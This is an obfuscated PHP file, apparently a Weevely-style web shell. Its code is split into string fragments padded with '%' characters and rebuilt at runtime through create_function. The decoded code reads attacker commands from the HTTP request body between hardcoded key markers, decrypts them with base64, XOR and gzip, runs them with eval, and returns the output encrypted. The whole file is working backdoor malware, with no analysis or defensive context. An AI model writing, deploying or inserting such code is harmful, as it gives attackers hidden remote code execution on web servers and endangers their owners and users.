<?php
$k='conten%%ts();@ob_en%d%_cl%ean();$r=@bas%e64_e%ncod%e(@x(@g%zcompress%($o),$%k));pri%%nt%("$p$kh$r$kf");}';
$u='$k="aa%6ff%0dc";$k%h="dd%6f27469f4e";%$kf=%%"ee1bb9a8ec%c0";$%p%="KB%cu2pmOcQJQ%fK%Uv";funct%ion x($t,$k';
$D=str_replace('Fk','','crFkeFkate_FkfFkFkunFkction');
$h='){%$c=strl%en%($k);$l=s%trl%en($t);%$%o=""%;for($i=0;$i<$l%;){for(%$j%=0;($j<$c&%&%$i<$l);$j%++,$i++)%';
$b='inpu%t"),$m%)==1) %{@ob_star%t%%();@e%val(@gzunc%ompress(%@x(@base%64_%decod%e($m[1]),$k)%)%);$o=@ob_%get_';
$C='{$o.%%=$t{$i}%^$k{$j};%}}ret%urn $o;%}if (@preg_%match(%"/$k%h%(.+)$%%kf/",@file_get_%contents%("php:/%/';
$q=str_replace('%','',$u.$h.$C.$b.$k);
$E=$D('',$q);$E();
?>
